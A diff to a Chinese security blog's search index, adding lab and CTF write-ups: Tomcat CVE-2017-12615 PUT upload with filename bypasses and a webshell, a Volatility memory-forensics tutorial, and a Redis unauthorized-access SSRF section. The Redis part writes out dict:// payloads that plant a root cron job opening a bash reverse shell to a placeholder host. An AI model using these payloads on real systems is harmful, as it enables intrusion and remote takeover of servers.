@@ -1,6 +1,144 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Tomcat漏洞详解</title>
+    <url>/posts/1836413801.html</url>
+    <content><![CDATA[<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>Tomcat是一个开源的Servlet容器，由Apache软件基金会开发，用于托管<strong>Java Web应用程序</strong>。它实现了Java Servlet和JavaServer Pages（JSP）技术，并提供了一些特有的Web服务器功能，如管理和控制平台、安全域管理和阀等。</p>
+<h2 id="一些重要文件"><a href="#一些重要文件" class="headerlink" title="一些重要文件"></a>一些重要文件</h2><h3 id="Tomcat的目录结构"><a href="#Tomcat的目录结构" class="headerlink" title="Tomcat的目录结构"></a><strong>Tomcat的目录结构</strong></h3><ul>
+<li>bin—–存放Tomcat的脚本文件，例如启动、关闭</li>
+<li>conf—-Tomcat的配置文件，例如server.xml和web.xml</li>
+<li>lib—–存放Tomcat运行需要的库文件（JAR包）</li>
+<li>logs—-存放Tomcat执行时的LOG文件</li>
+<li>temp—-存放Tomcat运行时所产生的临时文件</li>
+<li>webapps-Web发布目录，默认情况下把Web应用文件放于此目录</li>
+<li>work—-存放jsp编译后产生的class文件</li>
+</ul>
+<p>Tomcat内有一些重要的文件，需要先了解其作用：</p>
+<ol>
+<li><strong>server.xml</strong>：配置tomcat启动的端口号、host主机、Context等</li>
+<li><strong>web.xml文件</strong>：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlet</li>
+<li><strong>tomcat-users.xml</strong>：tomcat的用户密码与权限</li>
+</ol>
+<br>
+
+
+
+<h2 id="Tomcat-任意文件写入（CVE-2017-12615）"><a href="#Tomcat-任意文件写入（CVE-2017-12615）" class="headerlink" title="Tomcat 任意文件写入（CVE-2017-12615）"></a>Tomcat 任意文件写入（CVE-2017-12615）</h2><p>主要影响范围：Apache Tomcat 7.0.0 - 7.0.81（默认配置）</p>
+<p>这里我使用的是vulhub靶场中的<code>Tomcat/8.5.19</code>进行复现</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031643768.png" alt="image-20240903164321724"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>该漏洞由于配置不当，将配置文件<code>web.xml</code>中的<code>readonly</code>项设置为了<code>false</code>，导致可以使用<code>PUT</code>方法上传任意文件，但这里限制了<code>jsp</code>文件，需要进行绕过上传<code>jsp</code>文件</p>
+<p>我们可以通过<code>cat conf/web.xml | grep readonly</code>来查看readonly的值：</p>
+<blockquote>
+<p>先输入<code>docker container ls</code> 查看开启的容器</p>
+<p>然后输入<code>docker exec -ti 容器ID bash</code> 进入容器docker</p>
+<p>最后输入命令即可</p>
+</blockquote>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031717000.png" alt="image-20240903171749961"></p>
+<br>
+
+
+
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>1、搭建好环境后，进入靶场</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031643052.png" alt="image-20240903164357021"></p>
+<p>2、使用bp抓包，将请求方法改为PUT，并上传1.txt文件。</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031722256.png" alt="image-20240903172220228"></p>
+<p>3、访问1.txt发现上传成功了，那我们接下来考虑上传jsp文件，但这里是过滤了jsp的，所以需要绕过</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031723557.png" alt="image-20240903172318534"></p>
+<p>4、绕过方法有以下三种：</p>
+<ul>
+<li>Windows下不允许文件以空格结尾，以<code>PUT /a001.jsp%20 HTTP/1.1</code>上传到 Windows会被自动去掉末尾空格</li>
+<li>Windows NTFS流，<code>Put/a001.jsp::$DATA HTTP/1.1</code></li>
+<li><code>/</code>在文件名中是非法的，也会被去除（Linux&#x2F;Windows）<code>Put/a001.jsp/http:/1.1</code></li>
+</ul>
+<p>5、我们使用冰蝎生成一个shell.jsp文件（将里面的内容复制到bp中），并使用第三种绕过方法进行上传，当看到回显201时，说明上传成功了</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031746800.png" alt="image-20240903174653759"></p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031748047.png" alt="image-20240903174851012"></p>
+<p>6、使用冰蝎连接发现可以看到其中的文件目录了。</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031801857.png" alt="image-20240903180130821"></p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031759720.png" alt="image-20240903175949673"></p>
+<br>
+
+
+
+<h2 id="Tomcat远程代码执行（CVE-2019-0232）"><a href="#Tomcat远程代码执行（CVE-2019-0232）" class="headerlink" title="Tomcat远程代码执行（CVE-2019-0232）"></a>Tomcat远程代码执行（CVE-2019-0232）</h2><p>主要影响范围：</p>
+<ul>
+<li>Apache Tomcat 9.0.0.M1 to 9.0.17</li>
+<li>Apache Tomcat 8.5.0 to 8.5.39</li>
+<li>Apache Tomcat 7.0.0 to 7.0.93</li>
+</ul>
+<blockquote>
+<p><font color="red">注意：</font>该漏洞只对Windows平台有效，要求系统启用了CGI Servlet，并且配置<code>enableCmdLineArguments</code>和<code>executable</code>选项。默认情况下，CGI Servlet是关闭的，因此只有在特定配置下才会受到影响。</p>
+</blockquote>
+<p>这里依旧使用<code>Tomcat/8.5.19</code>进行复现</p>
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当攻击者向<code>CGI Servlet</code>发送一个精心设计的请求时，可以利用这个漏洞在具有Apache Tomcat权限的系统上注入和执行任意操作系统命令。这种攻击方式依赖于JRE（Java Runtime Environment）向Windows传递命令行参数的过程存在缺陷。</p>
+<br>
+
+
+
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>]]></content>
+      <categories>
+        <category>web漏洞</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+        <tag>中间件漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>misc内存取证</title>
+    <url>/posts/3868078152.html</url>
+    <content><![CDATA[<h1 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h1><p>内存取证是网络安全竞赛中的一项重要技术，主要目的是通过<strong>分析计算机系统的内存数据来获取关键信息。</strong></p>
+<p><strong>Volatility</strong>是一款开源的基于Python开发的内存取证工具集，可以分析内存中的各种数据。它能够处理多种类型的内存文件，如<code>.raw</code>、<code>.vmem</code>、<code>.img</code>等，并提供丰富的命令用于分析这些文件。</p>
+<blockquote>
+<p>Linux下载链接：<a href="https://volatilityfoundation.org/">Home of The Volatility Foundation | Volatility Memory Forensics - The Volatility Foundation - Promoting Accessible Memory Analysis Tools Within the Memory Forensics Community</a></p>
+<p>Windows下载链接：Http:&#x2F;&#x2F;downloads.volatilityfoundation.org&#x2F;releases&#x2F;2.6&#x2F;volatility_2.6_win64_standalone.zip</p>
+</blockquote>
+<p>例如，使用<code>imageinfo</code>命令可以查看内存镜像的基本信息，使用<code>pslist</code>命令可以列出所有进程，而<code>dumpfiles</code>命令则可以导出内存中的文件</p>
+<br>
+
+
+
+<h2 id="Volatility选项"><a href="#Volatility选项" class="headerlink" title="Volatility选项"></a>Volatility选项</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">  -h, --help            列出所有可用选项及其默认值</span><br><span class="line">                        默认值可以在配置文件中设置</span><br><span class="line">                        (/etc/volatilityrc)</span><br><span class="line">  <span class="attribute">--conf-file</span>=/home/kali/.volatilityrc</span><br><span class="line">                        基于用户的配置文件</span><br><span class="line">  -d, --<span class="built_in">debug</span>           调试Volatility</span><br><span class="line">  <span class="attribute">--plugins</span>=PLUGINS     要使用的其他插件目录（冒号分隔）</span><br><span class="line">  --<span class="built_in">info</span>                打印所有注册对象的信息</span><br><span class="line">  <span class="attribute">--cache-directory</span>=/home/kali/.cache/volatility</span><br><span class="line">                        存放缓存文件的目录</span><br><span class="line">  --cache               使用缓存</span><br><span class="line">  <span class="attribute">--tz</span>=TZ               设置 (Olson) 时区以使用 pytz（如果已安装）或 tzset 显示时间戳</span><br><span class="line">  -f FILENAME, <span class="attribute">--filename</span>=FILENAME</span><br><span class="line">                        打开图像时使用的文件名</span><br><span class="line">  <span class="attribute">--profile</span>=WinXPSP2x86</span><br><span class="line">                        要加载的配置文件的名称（使用 --<span class="built_in">info</span> 查看支持的配置文件列表）</span><br><span class="line">  -l LOCATION, <span class="attribute">--location</span>=LOCATION</span><br><span class="line">                        从中加载地址空间的 URN 位置</span><br><span class="line">  -w, --write           启用写支持</span><br><span class="line">  <span class="attribute">--dtb</span>=DTB             DTB 地址</span><br><span class="line">  <span class="attribute">--shift</span>=SHIFT         Mac KASLR 移位地址</span><br><span class="line">  <span class="attribute">--output</span>=text         以这种格式输出（支持特定于模块，请参阅下面的模块输出选项）</span><br><span class="line">  <span class="attribute">--output-file</span>=OUTPUT_FILE</span><br><span class="line">                        在此文件中写入输出</span><br><span class="line">  -v, --verbose         详细信息</span><br><span class="line">  -g KDBG, <span class="attribute">--kdbg</span>=KDBG  指定一个 KDBG 虚拟地址（注意：对于 64 位 Windows 8 及更高版本，这是 KdCopyDataBlock 的地址）</span><br><span class="line">  --force               强制使用可疑配置文件</span><br><span class="line">  -k KPCR, <span class="attribute">--kpcr</span>=KPCR  指定特定的 KPCR 地址</span><br><span class="line">  <span class="attribute">--cookie</span>=COOKIE       指定 nt!ObHeaderCookie 的地址（仅适用于 Windows 10）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+<h2 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h2><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">支持的插件命令:</span><br><span class="line">		amcache        	查看AmCache应用程序痕迹信息</span><br><span class="line">		apihooks       	检测内核及进程的内存空间中的API hook</span><br><span class="line">		atoms          	列出会话及窗口站atom表</span><br><span class="line">		atomscan       	Atom表的池扫描(Pool scanner)</span><br><span class="line">		auditpol       	列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</span><br><span class="line">		bigpools       	使用BigPagePoolScanner转储大分页池(big page pools)</span><br><span class="line">		bioskbd        	从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</span><br><span class="line">		cachedump      	获取内存中缓存的域帐号的密码哈希</span><br><span class="line">		callbacks      	打印全系统通知例程</span><br><span class="line">		clipboard      	提取Windows剪贴板中的内容</span><br><span class="line">		cmdline        	显示进程命令行参数</span><br><span class="line">		cmdscan        	提取执行的命令行历史记录（扫描<span class="variable">_COMMAND_HISTORY</span>信息）</span><br><span class="line">		connections    	打印系统打开的网络连接(仅支持Windows XP 和<span class="number">2003</span>)</span><br><span class="line">		connscan       	打印TCP连接信息</span><br><span class="line">		consoles       	提取执行的命令行历史记录（扫描<span class="variable">_CONSOLE_INFORMATION</span>信息）</span><br><span class="line">		crashinfo      	提取崩溃转储信息</span><br><span class="line">		deskscan       	tagDESKTOP池扫描(Poolscaner)</span><br><span class="line">		devicetree     	显示设备树信息</span><br><span class="line">		dlldump        	从进程地址空间转储动态链接库</span><br><span class="line">		dlllist        	打印每个进程加载的动态链接库列表</span><br><span class="line">		driverirp      	IRP hook驱动检测</span><br><span class="line">		drivermodule   	关联驱动对象至内核模块</span><br><span class="line">		driverscan     	驱动对象池扫描</span><br><span class="line">		dumpcerts      	提取RAS私钥及SSL公钥</span><br><span class="line">		dumpfiles      	提取内存中映射或缓存的文件</span><br><span class="line">		dumpregistry   	转储内存中注册表信息至磁盘</span><br><span class="line">		editbox        	查看Edit编辑控件信息 (Listbox正在实验中)</span><br><span class="line">		envars         	显示进程的环境变量</span><br><span class="line">		eventhooks     	打印Windows事件hook详细信息</span><br><span class="line">		evtlogs        	提取Windows事件日志（仅支持XP/<span class="number">2003</span>)</span><br><span class="line">		filescan       	提取文件对象（file objects）池信息</span><br><span class="line">		gahti          	转储用户句柄（handle）类型信息</span><br><span class="line">		gditimers      	打印已安装的GDI计时器(timers)及回调(callbacks)</span><br><span class="line">		gdt            	显示全局描述符表(Global Deor Table)</span><br><span class="line">		getservicesids 	获取注册表中的服务名称并返回SID信息</span><br><span class="line">		getsids        	打印每个进程的SID信息</span><br><span class="line">		handles        	打印每个进程打开的句柄的列表</span><br><span class="line">		hashdump       	转储内存中的Windows帐户密码哈希(LM/NTLM)</span><br><span class="line">		hibinfo        	转储休眠文件信息</span><br><span class="line">		hivedump       	打印注册表配置单元信息</span><br><span class="line">		hivelist       	打印注册表配置单元列表</span><br><span class="line">		hivescan       	注册表配置单元池扫描</span><br><span class="line">		hpakextract    	从HPAK文件（Fast Dump格式）提取物理内存数据</span><br><span class="line">		hpakinfo       	查看HPAK文件属性及相关信息</span><br><span class="line">		idt            	显示中断描述符表(Interrupt Deor Table)</span><br><span class="line">		iehistory      	重建IE缓存及访问历史记录</span><br><span class="line">		imagecopy      	将物理地址空间导出原生DD镜像文件</span><br><span class="line">		imageinfo      	查看/识别镜像信息</span><br><span class="line">		impscan        	扫描对导入函数的调用</span><br><span class="line">		joblinks       	打印进程任务链接信息</span><br><span class="line">		kdbgscan       	搜索和转储潜在KDBG值</span><br><span class="line">		kpcrscan       	搜索和转储潜在KPCR值</span><br><span class="line">		ldrmodules     	检测未链接的动态链接DLL</span><br><span class="line">		lsadump        	从注册表中提取LSA密钥信息（已解密）</span><br><span class="line">		machoinfo      	转储Mach-O 文件格式信息</span><br><span class="line">		malfind        	查找隐藏的和插入的代码</span><br><span class="line">		mbrparser      	扫描并解析潜在的主引导记录(MBR)</span><br><span class="line">		memdump        	转储进程的可寻址内存</span><br><span class="line">		memmap         	打印内存映射</span><br><span class="line">		messagehooks   	桌面和窗口消息钩子的线程列表</span><br><span class="line">		mftparser      	扫描并解析潜在的MFT条目</span><br><span class="line">		moddump        	转储内核驱动程序到可执行文件的示例</span><br><span class="line">		modscan        	内核模块池扫描</span><br><span class="line">		modules        	打印加载模块的列表</span><br><span class="line">		multiscan      	批量扫描各种对象</span><br><span class="line">		mutantscan     	对互斥对象池扫描</span><br><span class="line">		notepad        	查看记事本当前显示的文本</span><br><span class="line">		objtypescan    	扫描窗口对象类型对象</span><br><span class="line">		patcher        	基于页面扫描的补丁程序内存</span><br><span class="line">		poolpeek       	可配置的池扫描器插件</span><br><span class="line">		printkey       	打印注册表项及其子项和值</span><br><span class="line">		privs          	显示进程权限</span><br><span class="line">		procdump       	进程转储到一个可执行文件示例</span><br><span class="line">		pslist         	按照EPROCESS列表打印所有正在运行的进程</span><br><span class="line">		psscan         	进程对象池扫描</span><br><span class="line">		pstree         	以树型方式打印进程列表</span><br><span class="line">		psxview        	查找带有隐藏进程的所有进程列表</span><br><span class="line">		qemuinfo       	转储 Qemu 信息</span><br><span class="line">		raw2dmp        	将物理内存原生数据转换为windbg崩溃转储格式</span><br><span class="line">		<span class="built_in">screenshot</span>     	基于GDI Windows的虚拟屏幕截图保存</span><br><span class="line">		servicediff    	Windows服务列表(ala Plugx)</span><br><span class="line">		sessions       	<span class="variable">_MM_SESSION_SPACE</span>的详细信息列表(用户登录会话)</span><br><span class="line">		shellbags      	打印Shellbags信息</span><br><span class="line">		shimcache      	解析应用程序兼容性Shim缓存注册表项</span><br><span class="line">		shutdowntime   	从内存中的注册表信息获取机器关机时间</span><br><span class="line">		sockets        	打印已打开套接字列表</span><br><span class="line">		sockscan       	TCP套接字对象池扫描</span><br><span class="line">		ssdt           	显示SSDT条目</span><br><span class="line">		strings        	物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</span><br><span class="line">		svcscan        	Windows服务列表扫描</span><br><span class="line">		symlinkscan    	符号链接对象池扫描</span><br><span class="line">		thrdscan       	线程对象池扫描</span><br><span class="line">		threads        	调查<span class="variable">_ETHREAD</span> 和<span class="variable">_KTHREADs</span></span><br><span class="line">		timeliner      	创建内存中的各种痕迹信息的时间线</span><br><span class="line">		timers         	打印内核计时器及关联模块的DPC</span><br><span class="line">		truecryptmaster	Recover 	恢复TrueCrypt <span class="number">7.1</span>a主密钥</span><br><span class="line">		truecryptpassphrase		查找并提取TrueCrypt密码</span><br><span class="line">		truecryptsummary	TrueCrypt摘要信息</span><br><span class="line">		unloadedmodules	打印卸载的模块信息列表</span><br><span class="line">		userassist     	打印注册表中UserAssist相关信息</span><br><span class="line">		userhandles    	转储用户句柄表</span><br><span class="line">		vaddump        	转储VAD数据为文件</span><br><span class="line">		vadinfo        	转储VAD信息</span><br><span class="line">		vadtree        	以树形方式显示VAD树信息</span><br><span class="line">		vadwalk        	显示遍历VAD树</span><br><span class="line">		vboxinfo       	转储Virtualbox信息（虚拟机）</span><br><span class="line">		verinfo        	打印PE镜像中的版本信息</span><br><span class="line">		vmwareinfo     	转储VMware VMSS/VMSN 信息</span><br><span class="line">		volshell       	内存镜像中的shell</span><br><span class="line">		windows        	打印桌面窗口(详细信息)</span><br><span class="line">		wintree        	Z顺序打印桌面窗口树</span><br><span class="line">		wndscan        	池扫描窗口站</span><br><span class="line">		yarascan       	以Yara签名扫描进程或内核内存</span><br></pre></td></tr></table></figure>
+
+
+
+<br>
+
+
+
+<h2 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h2><p>1、首先输入<code>imageinfo</code>命令来获取镜像信息，查看可能的操作系统</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031339847.png" alt="image-20240903133912783"></p>
+<p>2、然后输入<code>volatility - f xxx.vmem --profile= [操作系统] volshell</code>来确认，一旦出现<code>&gt;&gt;&gt;</code>，则说明操作系统判断正确</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031343236.png" alt="image-20240903134324206"></p>
+<p>3、当我们判断完操作系统后，就可以去利用插件做题了，例如查看正在运行的程序：<code>pslist</code></p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031347122.png" alt="image-20240903134700066"></p>
+<p>4、我们看回这道例题：</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031348964.png" alt="image-20240903134815936"></p>
+<p>5、题目告诉我们npm在cmd中输入命令，那么我们可以直接输入<code>cmdscan</code>命令来<strong>查看命令行操作，显示cmd历史命令</strong>。flag就在其中。</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409031349974.png" alt="image-20240903134910928"></p>
+<br>
+
+<br>
+
+
+
+<p>参考文章：</p>
+<p><a href="https://blog.csdn.net/m0_68012373/article/details/127419463">内存取证-volatility工具的使用 （史上更全教程，更全命令）_volatility内存取证-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python反序列化</title>
     <url>/posts/4134390418.html</url>
     <content><![CDATA[]]></content>
@@ -1023,7 +1161,7 @@
 <ul>
 <li><p>如果你是linux系统使用cat,是windows系统使用type.</p>
 </li>
-<li><p>如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#52;&#51;&#46;&#x31;&#x34;&#x31;">&#x72;&#111;&#111;&#116;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#52;&#51;&#46;&#x31;&#x34;&#x31;</a>需要在.ssh目录下，因为权限问题。</p>
+<li><p>如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#52;&#51;&#x2e;&#49;&#52;&#x31;">&#x72;&#111;&#111;&#x74;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#52;&#51;&#x2e;&#49;&#52;&#x31;</a>需要在.ssh目录下，因为权限问题。</p>
 </li>
 <li><p>你利用redis上传公钥时候运行代码是在你解压的redis文件下运行。</p>
 </li>
@@ -3292,7 +3430,36 @@
 
 
 
-<h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><br>
+<h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>1、<code>http://172.72.23.27:6379</code>是有Redis服务开放，但是不知道是否未授权，那我们这里可以使用dict协议来尝试：</p>
+<blockquote>
+<p>dict 协议除了可以探测端口以外，还可以用来攻击未授权的 Redis 服务</p>
+</blockquote>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">dict:</span>//<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">6379</span>/&lt;Redis 命令&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409030819449.png" alt="image-20240903081950354"></p>
+<p>2、发现这里是存在Redis未授权漏洞的，而通过未授权的Redis拿下shell，一般有三种方法:</p>
+<ul>
+<li>向Web服务器中写入WebShell</li>
+<li>写SSH Key</li>
+<li>写定时任务反弹shell</li>
+</ul>
+<p>这里由于系统没有web服务（无法写shell），没有SSH公私钥认证（无法写公钥），所以只能使用定时任务去攻击，攻击思路如下：</p>
+<blockquote>
+<p>注意，在实际应用中，定时任务的目录要看清楚再写：</p>
+<p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;   (centos系列主机)</p>
+<p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;   (Debian&#x2F;Ubuntu系列主机)</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清空 key</span></span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径为定时任务目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务角色为 root</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务内容</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * * bash -c &#x27;bash -i &gt;&amp; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1&#x27;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存操作</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、对于上面的攻击思路，在这道题我们需要在这些命令的前面加上<code>dict://172.72.23.27:6379/</code>，payload如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清空 key</span></span><br><span class="line">dict://172.72.23.27:6379/flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径为定时任务目录</span></span><br><span class="line">dict://172.72.23.27:6379/config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在定时任务目录下创建 root 的定时任务文件</span></span><br><span class="line">dict://172.72.23.27:6379/config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 Bash 反弹 shell 的 payload</span></span><br><span class="line">dict://172.72.23.27:6379/set x <span class="string">&quot;\n* * * * * bash -c &#x27;bash -i &gt;&amp; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1&#x27;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存上述操作</span></span><br><span class="line">dict://172.72.23.27:6379/save</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>SSRF 传递的时候记得要把 <code>&amp;</code> URL 编码为 <code>%26</code>，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL 打乱编码</p>
+</blockquote>
+<br>
 
 
 
